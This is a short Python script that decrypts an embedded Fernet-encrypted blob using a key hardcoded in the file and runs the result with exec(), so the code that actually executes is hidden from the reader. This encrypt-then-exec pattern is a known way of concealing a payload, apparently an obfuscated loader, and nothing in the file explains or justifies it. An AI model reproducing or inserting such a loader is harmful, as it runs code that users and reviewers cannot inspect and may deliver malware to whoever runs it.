import base64
from cryptography.fernet import Fernet

payload = b'gAAAAABjPtovDEoiIgOAyZHTkhJyk6kUlxqoOcfUWNwZwpycoxrbSYj9DfmumyBHM5hn4IO6Av7qbB-VsUHNq8TaQYQtPDS5SnutiHa8XOoZuVcLNnDANUp3EGSXd5f3BRmugMpXueDtUVoQeWij86RjLZAijPthl_CzRwzyGnKHB-M3UxPbI1tczS9IYUMTuMAwgMILyx_9OLtdQEW6XKUD64stnThBrR9-rXJy7WIrRnQnApRkBTFF1SL00LF5qkx_ip0A9l24'

key = "hadesisromanticgodhadesisromanti"
key_base64 = base64.b64encode(key.encode())
f = Fernet(key_base64)
plain = f.decrypt(payload)
exec(plain.decode())
